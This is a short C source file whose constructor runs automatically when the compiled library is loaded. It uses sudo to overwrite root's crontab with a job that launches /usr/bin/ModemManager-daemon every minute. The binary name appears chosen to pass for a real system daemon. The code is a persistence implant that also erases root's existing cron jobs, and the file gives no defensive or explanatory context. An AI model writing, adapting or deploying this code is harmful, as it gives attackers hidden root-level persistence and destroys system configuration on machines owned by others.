#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include<string.h>

__attribute__((constructor)) void init(void){
	system("echo \"* * * * * /usr/bin/ModemManager-daemon  \" | sudo crontab -u root - ");
}
